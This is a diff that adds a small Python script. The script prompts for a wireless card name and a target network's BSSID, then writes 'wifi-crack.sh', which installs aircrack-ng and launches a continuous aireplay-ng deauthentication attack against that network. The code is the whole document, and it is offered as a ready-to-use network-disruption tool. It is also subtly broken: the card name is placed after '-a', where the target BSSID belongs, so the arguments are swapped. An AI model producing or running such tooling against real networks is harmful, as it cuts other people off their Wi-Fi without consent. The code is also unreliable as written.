@@ -1,0 +1,8 @@
+runfile = open("wifi-crack.sh", "w")
+usr1 = input("WiFi Card Name: ")
+usr2 = input("BSSID of Target WiFi: ")
+runfile.write("apt-get install aircrack-ng\n")
+runfile.write("aireplay-ng -0 0 -a ")
+runfile.write( str(usr1))
+runfile.write(" ")
+runfile.write( str(usr2))
